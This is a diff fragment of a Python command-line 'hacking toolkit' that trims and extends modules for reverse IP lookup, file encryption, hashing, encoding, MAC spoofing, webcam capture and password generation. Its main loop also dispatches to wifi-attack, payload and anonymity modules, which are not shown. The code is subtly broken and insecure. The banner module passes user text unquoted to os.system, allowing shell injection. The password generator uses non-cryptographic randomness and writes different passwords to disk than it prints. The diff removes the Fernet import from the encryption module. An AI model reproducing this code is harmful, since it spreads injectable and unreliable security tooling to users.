 ║                    REVERSE IP LOOKUP                                 ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
-        ip = input(f"{self.prompt()}IP address > ")
+        ip = input(f"{self.prompt()}IP > ")
         
         try:
             import dns.reversename
@@ -823,91 +815,69 @@ end''',
             print(f"{Colors.GREEN}[+] PTR Record:{Colors.END}")
             print(f"    {dns.resolver.resolve(addr, 'PTR')[0]}")
         except:
-            print(f"{Colors.RED}[!] No PTR record found{Colors.END}")
+            print(f"{Colors.RED}[!] No PTR record{Colors.END}")
     
     # ============================================================
     # UTILITY MODULES
     # ============================================================
     
     def file_crypt(self):
-        """File encryption/decryption with AES"""
-        try:
-            from cryptography.fernet import Fernet
-        except:
-            print(f"{Colors.RED}[!] Install cryptography: pip install cryptography{Colors.END}")
-            return
-        
+        """File encryption/decryption"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    FILE CRYPT MODULE                                 ║
-║              "Lock secrets away"                                      ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
         
-        print(f"{Colors.GREEN}[1]{Colors.WHITE} Encrypt file")
-        print(f"{Colors.GREEN}[2]{Colors.WHITE} Decrypt file")
+        print(f"{Colors.GREEN}[1]{Colors.WHITE} Encrypt")
+        print(f"{Colors.GREEN}[2]{Colors.WHITE} Decrypt")
         choice = input(self.prompt())
         
         if choice == '1':
-            filepath = input(f"{self.prompt()}file to encrypt > ")
+            filepath = input(f"{self.prompt()}file > ")
             if os.path.exists(filepath):
                 key = Fernet.generate_key()
                 cipher = Fernet(key)
-                
                 with open(filepath, 'rb') as f:
                     data = f.read()
                 encrypted = cipher.encrypt(data)
-                
-                outfile = filepath + '.enc'
-                with open(outfile, 'wb') as f:
+                with open(filepath + '.enc', 'wb') as f:
                     f.write(encrypted)
-                
-                keyfile = filepath + '.key'
-                with open(keyfile, 'wb') as f:
+                with open(filepath + '.key', 'wb') as f:
                     f.write(key)
-                
-                print(f"{Colors.GREEN}[+] Encrypted: {outfile}{Colors.END}")
-                print(f"{Colors.GREEN}[+] Key saved: {keyfile}{Colors.END}")
-            else:
-                print(f"{Colors.RED}[!] File not found{Colors.END}")
-        
+                print(f"{Colors.GREEN}[+] Encrypted: {filepath}.enc{Colors.END}")
+                print(f"{Colors.GREEN}[+] Key: {filepath}.key{Colors.END}")
         elif choice == '2':
             encfile = input(f"{self.prompt()}encrypted file > ")
             keyfile = input(f"{self.prompt()}key file > ")
-            
             if os.path.exists(encfile) and os.path.exists(keyfile):
                 with open(keyfile, 'rb') as f:
                     key = f.read()
                 cipher = Fernet(key)
-                
                 with open(encfile, 'rb') as f:
                     data = f.read()
                 decrypted = cipher.decrypt(data)
-                
-                outfile = encfile.replace('.enc', '.dec')
-                with open(outfile, 'wb') as f:
+                with open(encfile.replace('.enc', '.dec'), 'wb') as f:
                     f.write(decrypted)
-                
-                print(f"{Colors.GREEN}[+] Decrypted: {outfile}{Colors.END}")
-            else:
-                print(f"{Colors.RED}[!] Files not found{Colors.END}")
+                print(f"{Colors.GREEN}[+] Decrypted: {encfile.replace('.enc', '.dec')}{Colors.END}")
     
     def hash_generator(self):
-        """Generate hashes (MD5, SHA1, SHA256)"""
+        """Generate hashes"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
-║                    HASH GENERATOR MODULE                             ║
+║                    HASH GENERATOR                                    ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
-        text = input(f"{self.prompt()}text to hash > ")
+        text = input(f"{self.prompt()}text > ")
         
         print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
         print(f"    MD5: {hashlib.md5(text.encode()).hexdigest()}")
         print(f"    SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
         print(f"    SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
+        print(f"    SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
     
     def encode_decode(self):
-        """Base64 and URL encoder/decoder"""
+        """Base64/URL encode decode"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    ENCODE/DECODE MODULE                              ║
@@ -923,69 +893,95 @@ end''',
         text = input(f"{self.prompt()}text > ")
         
         if choice == '1':
-            encoded = base64.b64encode(text.encode()).decode()
-            print(f"{Colors.GREEN}[+] Base64: {encoded}{Colors.END}")
+            print(f"{Colors.GREEN}[+] {base64.b64encode(text.encode()).decode()}{Colors.END}")
         elif choice == '2':
             try:
-                decoded = base64.b64decode(text).decode()
-                print(f"{Colors.GREEN}[+] Decoded: {decoded}{Colors.END}")
+                print(f"{Colors.GREEN}[+] {base64.b64decode(text).decode()}{Colors.END}")
             except:
                 print(f"{Colors.RED}[!] Invalid Base64{Colors.END}")
         elif choice == '3':
-            encoded = requests.utils.quote(text)
-            print(f"{Colors.GREEN}[+] URL Encoded: {encoded}{Colors.END}")
+            print(f"{Colors.GREEN}[+] {requests.utils.quote(text)}{Colors.END}")
         elif choice == '4':
-            decoded = requests.utils.unquote(text)
-            print(f"{Colors.GREEN}[+] URL Decoded: {decoded}{Colors.END}")
+            print(f"{Colors.GREEN}[+] {requests.utils.unquote(text)}{Colors.END}")
     
     def mac_changer(self):
-        """MAC address changer (requires root)"""
+        """MAC address changer"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
 ║                    MAC CHANGER MODULE                                ║
-║              "Change your identity"                                   ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
         
-        # Check if root
         if os.geteuid() != 0:
-            print(f"{Colors.RED}[!] Root required for MAC changing{Colors.END}")
+            print(f"{Colors.RED}[!] Root required{Colors.END}")
             return
         
-        interfaces = os.listdir('/sys/class/net/')
-        print(f"{Colors.GREEN}Available interfaces:{Colors.END}")
-        for iface in interfaces:
-            if iface.startswith(('eth', 'wlan', 'enp', 'wl')):
-                print(f"    {iface}")
+        interfaces = [i for i in os.listdir('/sys/class/net/') if i.startswith(('eth', 'wlan', 'enp', 'wl'))]
+        print(f"{Colors.GREEN}Available: {', '.join(interfaces)}{Colors.END}")
         
         iface = input(f"{self.prompt()}interface > ")
-        
         if iface in interfaces:
             os.system(f"ifconfig {iface} down")
             os.system(f"macchanger -r {iface}")
             os.system(f"ifconfig {iface} up")
-            print(f"{Colors.GREEN}[+] MAC address changed on {iface}{Colors.END}")
-        else:
-            print(f"{Colors.RED}[!] Interface not found{Colors.END}")
+            print(f"{Colors.GREEN}[+] MAC changed on {iface}{Colors.END}")
     
     def webcam_capture(self):
-        """Capture photo from webcam (termux-api)"""
+        """Webcam capture"""
         print(f"""
 {Colors.RED}╔═══════════════════════════════════════════════════════════════╗
-║                    WEBCAM CAPTURE MODULE                             ║
+║                    WEBCAM CAPTURE                                    ║
 ╚═══════════════════════════════════════════════════════════════╝{Colors.END}
         """)
         
-        # Check if termux-api is available
-        termux_check = subprocess.run(['which', 'termux-camera-photo'], capture_output=True)
-        
-        if termux_check.returncode == 0:
+        if os.system("which termux-camera-photo > /dev/null 2>&1") == 0:
             filename = f"{self.shadow_dir}/webcam_{int(time.time())}.jpg"
             os.system(f"termux-camera-photo {filename}")
-            print(f"{Colors.GREEN}[+] Photo saved: {filename}{Colors.END}")
+            print(f"{Colors.GREEN}[+] Photo: {filename}{Colors.END}")
         else:
-            print(f"{Colors.YELLOW}[!] termux-camera-photo not found{Colors.END}")
-            print(f"{Colors.YELLOW}[*] Install termux-api: pkg install termux-api{Colors.END}")
+            print(f"{Colors.RED}[!] termux-api required: pkg install termux-api{Colors.END}")
+    
+    def password_generator(self):
+        """Generate random passwords"""
+        print(f"""
+{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
+║                    PASSWORD GENERATOR                                ║
+╚═══════════════════════════════════════════════════════════════╝{Colors.END}
+        """)
+        
+        length = int(input(f"{self.prompt()}length (12) > ") or "12")
+        count = int(input(f"{self.prompt()}count (5) > ") or "5")
+        
+        chars = string.ascii_letters + string.digits + "!@#$%^&*"
+        
+        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
+        for i in range(count):
+            password = ''.join(random.choice(chars) for _ in range(length))
+            print(f"    {i+1}. {password}")
+        
+        filename = f"{self.shadow_dir}/passwords_{int(time.time())}.txt"
+        with open(filename, 'w') as f:
+            for i in range(count):
+                f.write(f"{i+1}. {''.join(random.choice(chars) for _ in range(length))}\n")
+        print(f"\n{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
+    
+    def banner_generator(self):
+        """Generate ASCII banners"""
+        print(f"""
+{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
+║                    BANNER GENERATOR                                  ║
+╚═══════════════════════════════════════════════════════════════╝{Colors.END}
+        """)
+        
+        text = input(f"{self.prompt()}text > ")
+        
+        print(f"\n{Colors.GREEN}[+] ASCII Art:{Colors.END}")
+        try:
+            import pyfiglet
+            banner = pyfiglet.figlet_format(text)
+            print(banner)
+        except:
+            os.system(f"figlet {text}")
     
     # ============================================================
     # MAIN LOOP
@@ -999,7 +995,7 @@ end''',
             try:
                 cmd = input(self.prompt()).strip().lower()
                 
-                # Attack modules
+                # Attack
                 if cmd in ['wifi', 'w']:
                     self.wifi_attack()
                 elif cmd in ['payload', 'p']:
@@ -1011,18 +1007,18 @@ end''',
                 elif cmd in ['anon', 'a']:
                     self.anonymity()
                 
-                # OSINT modules
-                elif cmd in ['phone', 'tel', 'caller']:
+                # OSINT
+                elif cmd in ['phone', 'tel']:
                     self.phone_osint()
-                elif cmd in ['ip', 'geo', 'track', 'locate']:
+                elif cmd in ['ip', 'geo', 'track']:
                     self.ip_tracker()
-                elif cmd in ['username', 'user', 'social', 'sherlock']:
+                elif cmd in ['username', 'user']:
                     self.username_check()
-                elif cmd in ['subdomain', 'sub', 'dnsrecon']:
+                elif cmd in ['subdomain', 'sub']:
                     self.subdomain_scan()
-                elif cmd in ['port', 'scan', 'nmap']:
+                elif cmd in ['port', 'scan']:
                     self.port_scanner()
-                elif cmd in ['dork', 'google', 'ghdb']:
+                elif cmd in ['dork', 'google']:
                     self.dork_generator()
                 elif cmd in ['email', 'mail']:
                     self.email_osint()
@@ -1030,13 +1026,13 @@ end''',
                     self.whois_lookup()
                 elif cmd in ['dns']:
                     self.dns_lookup()
-                elif cmd in ['reverseip', 'revip', 'ptr']:
+                elif cmd in ['reverseip', 'revip']:
                     self.reverse_ip()
                 
-                # Utility modules
+                # Utility
                 elif cmd in ['crypt', 'encrypt', 'decrypt']:
                     self.file_crypt()
-                elif cmd in ['hash', 'md5', 'sha']:
+                elif cmd in ['hash']:
                     self.hash_generator()
                 elif cmd in ['encode', 'decode', 'base64']:
                     self.encode_decode()
@@ -1044,11 +1040,15 @@ end''',
                     self.mac_changer()
                 elif cmd in ['webcam', 'cam']:
                     self.webcam_capture()
+                elif cmd in ['passgen', 'pg']:
+                    self.password_generator()
+                elif cmd in ['banner']:
+                    self.banner_generator()
                 
-                # System commands
+                # System
                 elif cmd in ['clear', 'cls']:
                     self.clear_screen()
-                elif cmd in ['help', '?', 'menu']:
+                elif cmd in ['help', '?']:
                     self.show_help()
                 elif cmd in ['exit', 'quit', 'q']:
                     print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
@@ -1056,7 +1056,7 @@ end''',
                 elif cmd == '':
                     continue
                 else:
-                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help' for available commands.{Colors.END}")
+                    print(f"{Colors.RED}[!] Unknown: {cmd}. Type 'help'{Colors.END}")
                     
             except KeyboardInterrupt:
                 print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
